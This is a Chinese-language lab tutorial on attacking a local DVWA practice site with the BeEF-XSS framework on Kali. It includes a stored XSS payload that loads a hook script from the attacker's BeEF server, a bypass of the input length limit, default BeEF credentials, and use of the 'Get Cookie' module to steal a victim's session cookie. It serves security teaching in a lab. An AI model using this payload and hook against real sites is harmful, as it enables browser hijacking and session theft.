# 

# BeEF-XSS渗透框架的使用

## 搭建靶场

<img src="https://pic.imgdb.cn/item/64de1693661c6c8e54451348.jpg" style="zoom: 50%;" />

将DVWA靶场安装包解压到根目录

![](https://pic.imgdb.cn/item/64de1770661c6c8e54495d72.jpg)

修改配置文件

<img src="https://pic.imgdb.cn/item/64de3533661c6c8e54c771db.jpg" style="zoom: 67%;" />

<img src="https://pic.imgdb.cn/item/64de379a661c6c8e54d477db.jpg" style="zoom:67%;" />

<img src="https://pic.imgdb.cn/item/64de3824661c6c8e54d6f1c9.jpg" style="zoom:67%;" />

​	

​	

## BeEF-XSS渗透框架的使用【KALI】

安装BeEF：`sudo apt-get install beef-xss`

运行BeEF：`beef-xss`

<img src="https://pic.imgdb.cn/item/64de3a16661c6c8e54df35d6.jpg" style="zoom:67%;" />

`ifconfig`查看KALI机的IP

<img src="https://pic.imgdb.cn/item/64de3ab9661c6c8e54e17498.jpg" style="zoom:67%;" />

在真机上访问BeEF的Web UI: `http://192.168.1.130:3000/ui/panel`

> 在真机上访问BeEF要把环回地址127.0.0.1改成KALI机的IP

<img src="https://pic.imgdb.cn/item/64de3c17661c6c8e54e6ddf2.jpg" style="zoom:67%;" />

> BeEF的默认用户名密码为beef、beef
>
> 首次登录会要求改密码，若改完的密码忘了可以通过`vim /etc/beef-xss/config.yaml`查看或修改

​	

​	

## BeEF实战

首先设置DVWA靶场的难度

<img src="https://pic.imgdb.cn/item/64de3d3c661c6c8e54ebd123.jpg" style="zoom:67%;" />

来到XSS (Stored)——存储型XSS关卡

在留言板Name那栏输入poc：`<script>alert(1)</script>`，发现字符数超过上限

<img src="https://pic.imgdb.cn/item/64de3e4d661c6c8e54f0aae4.jpg" style="zoom: 50%;" />

解决方法：`F12`打开开发者模式

![](https://pic.imgdb.cn/item/64de3fe8661c6c8e54f9dc9b.jpg)

将限制的数量改大些

改好后输入poc

<img src="https://pic.imgdb.cn/item/64de402b661c6c8e54fb0915.jpg" style="zoom:67%;" />

页面出现弹窗，说明存在XSS漏洞

<img src="https://pic.imgdb.cn/item/64de407a661c6c8e54fca740.jpg" style="zoom:50%;" />

之后刷新页面，还是出现弹窗，说明属于存储型XSS

已经用poc确定存储型XSS存在，接下来就是利用BeEF渗透测试框架来利用这个漏洞

在留言板Name那栏输入payload：`<script src="http://192.168.1.130:3000/hook.js"></script>`(记得先通过开发者模式修改字符数限制)

<img src="https://pic.imgdb.cn/item/64de4279661c6c8e5405aedc.jpg" style="zoom:50%;" />

当我们访问这个界面时恶意脚本就被执行了

去BeEF的Web UI，发现真机已经在"上线"列表中了

<img src="https://pic.imgdb.cn/item/64de4336661c6c8e5408d5ae.jpg" style="zoom:50%;" />

打开命令界面

![](https://pic.imgdb.cn/item/64de44b0661c6c8e540f0558.jpg)

- 绿色：对目标主机生效并且不可见(不会被发现)
- 橙色：对目标主机生效但可能可见(可能被发现)
- 灰色：在目标主机上的效果有待验证
- 红色：对目标主机不生效

例如"Get Cookie"模块

<img src="https://pic.imgdb.cn/item/64de4512661c6c8e54103a83.jpg" style="zoom:50%;" />

获得受害者在那个被利用了XSS漏洞网站的Cookie

![](https://pic.imgdb.cn/item/64de457d661c6c8e54119a7c.jpg)

